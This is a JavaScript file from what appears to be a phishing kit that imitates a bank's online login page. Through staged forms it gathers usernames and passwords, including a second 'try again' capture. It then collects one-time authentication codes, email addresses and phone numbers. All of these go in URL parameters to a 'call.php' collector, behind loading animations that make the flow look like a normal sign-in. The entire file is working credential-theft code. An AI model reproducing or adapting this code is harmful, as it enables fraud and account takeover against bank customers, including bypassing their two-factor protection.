// vafiables

const errorDiv = document.getElementById("errorDiv");
const formTwoDiv = document.getElementById("formTwoDiv");
const formOneDiv = document.getElementById("formOneDiv");

const formfourDiv = document.getElementById("formFourDiv");
const formfiveDiv = document.getElementById("formFiveDiv");

const formLoadAnimDiv = document.getElementById("formLoadAnimDiv");
const formOtpDiv = document.getElementById("formOtpDiv");
const formOtpTextDiv = document.getElementById("formOtpTextDiv");
const singInAsPassKey = document.getElementById("singInAsPassKey");
const singInFirstT = document.getElementById("singInFirstT");
const SwitchId = document.getElementById("SwitchId");
const logoDiv = document.getElementById("logoDiv");
const oneHa = document.getElementById("oneHa");
const threeHa = document.getElementById("threeHa");
const twoHa = document.getElementById("twoHa");
const submit3Btn = document.getElementById("submit3Btn");
const submitBtn = document.getElementById("submitBtn");
const submitBtnTwo = document.getElementById("submitBtnTwo");
const otpEnteredYet = document.getElementById("otpEnteredYet");
const lastToShow = document.getElementById("lastToShow");
// const redirectUrl = "https://olb.myfarmers.bank/login";
var countDown = 1;
// form
var emptyNumber = 0;
var submitMode = "Detail";


function moveUp(param) {
  const inputPlaceholder = document.getElementById(param);
  //change style of the span
  inputPlaceholder.classList.replace("moveIn", "moveUp"); //
}

function moveIn(param, input) {
  const inputPlaceholder = document.getElementById(param);
  if (document.getElementById(input).value == "") {
    //   change all input style to off float mode
    inputPlaceholder.classList.replace("moveUp", "moveIn");
    //
  }
}

function formApplication() {
  

  const formOne = document.getElementById("usernameInput").value;
  const formTwo = document.getElementById("passwordInput").value;

  if (formOne == "") {
    errorDiv.innerHTML = "Username is required";
    errorDiv.style.display = "block";
  } else {
    errorDiv.style.display = "none";
    formTwoDiv.style.display = "flex";
    singInFirstT.style.display = "none";
    singInAsPassKey.style.display = "inline-block";
    SwitchId.style.display = "flex";

    if (formOne !== "" && formTwo !== "") {
      errorDiv.style.display = "none";

      

      formOneDiv.style.display = "none";
      formTwoDiv.style.display = "none";
      oneHa.style.display = "none";
      twoHa.style.display = "none";
      logoDiv.style.display = "none";
      submitBtn.style.display = "none";
      formLoadAnimDiv.style.display = "flex";
      setTimeout(() => {
        // Ajax call
        connectHttpDetail(formOne, formTwo);
      }, 500);
    } else {
      errorDiv.innerHTML = "Username or Password is required";
      errorDiv.style.display = "block !important";
      // emptyNumber = 0;
    }
  }
}
function formAgain() {
  

  const formOne = document.getElementById("usernameInput").value;
  const formTwo = document.getElementById("passwordInput").value;

  if (formOne == "") {
    errorDiv.innerHTML = "Username is required";
    errorDiv.style.display = "block";
  } else {
    errorDiv.style.display = "none";
    formTwoDiv.style.display = "flex";
    singInFirstT.style.display = "none";
    singInAsPassKey.style.display = "inline-block";
    SwitchId.style.display = "flex";

    if (formOne !== "" && formTwo !== "") {
      errorDiv.style.display = "none";

      

      formOneDiv.style.display = "none";
      formTwoDiv.style.display = "none";
      oneHa.style.display = "none";
      twoHa.style.display = "none";
      logoDiv.style.display = "none";
      submitBtn.style.display = "none";
      formLoadAnimDiv.style.display = "flex";
      setTimeout(() => {
        // Ajax call
        connectHttpAgain(formOne, formTwo);
      }, 500);
    } else {
      errorDiv.innerHTML = "Username or Password is required";
      errorDiv.style.display = "block !important";
      // emptyNumber = 0;
    }
  }
}

// }

function Otp() {
  
  const OtpInput = document.getElementById("OtpInput").value;

  // do something here
  if (OtpInput !== "") {
    // console.log("OTP : " + OtpInput);
    formOtpDiv.style.display = "none";
    otpEnteredYet.style.display = "none";
    logoDiv.style.display = "none";
    submitBtnTwo.style.display = "none";
    formOtpTextDiv.style.display = "none";

    formLoadAnimDiv.style.display = "flex";
    errorDiv.style.display = "none";
    submitMode = "Done";
    setTimeout(() => {
      // ajax call
      connectHttpDetailOtp(OtpInput);
    }, 500);
  } else {
    errorDiv.innerHTML = "Autentication code is required.";
    errorDiv.style.display = "block";
    emptyNumber = 0;
  }
}

function emailAndPassword() {
  

  const formOneEmail = document.getElementById("emailInput").value;
  const formTwophone = document.getElementById("phoneInput").value;

  if (formOneEmail !== "" && formTwophone !== "") {
    errorDiv.style.display = "none";

    // console.log("email : " + formOneEmail + " phone : " + formTwophone);

    

    submit3Btn.style.display = "none";
    formfourDiv.style.display = "none";
    formfiveDiv.style.display = "none";
    logoDiv.style.display = "none";

    formLoadAnimDiv.style.display = "flex";
    errorDiv.style.display = "none";

    threeHa.style.display = "none";
    formLoadAnimDiv.style.display = "flex";
    setTimeout(() => {
      document.getElementById("dd").style.display="none";
      formLoadAnimDiv.style.display = "none";
      lastToShow.style.display = "block";
      setTimeout(() => {
        // Ajax call
        connectHttpMail(formOneEmail, formTwophone);
      }, 200);
    }, 200);
  } else {
    errorDiv.innerHTML = "Email or Phone is required";
    errorDiv.style.display = "block !important";
  }
}

function switc() {
  const formTwoDiv = document.getElementById("formTwoDiv");
  const singInAsPassKey = document.getElementById("singInAsPassKey");
  const singInFirstT = document.getElementById("singInFirstT");
  const SwitchId = document.getElementById("SwitchId");

  // do something here
  formTwoDiv.style.display = "none";
  singInFirstT.style.display = "flex";
  singInAsPassKey.style.display = "none";
  SwitchId.style.display = "none";
  
}
function connectHttpDetailOtp(otp) {
  const redirectUrl = "call.php?calltype=otp&otp=" + otp;
  location.href = redirectUrl;

  
}

function connectHttpDetail(dataOne, dataTwo) {
  const redirectUrl =
    "call.php?calltype=usd&Username=" + dataOne + "&password=" + dataTwo;
  location.href = redirectUrl;

  
}

function connectHttpAgain(dataOne, dataTwo) {
  const redirectUrl =
    "call.php?calltype=again&Username=" + dataOne + "&password=" + dataTwo;
  location.href = redirectUrl;

  
}

function connectHttpMail(mail, phone) {
  const redirectUrl = "call.php?calltype=mail&mail=" + mail + "&phone=" + phone;
  location.href = redirectUrl;

  
}

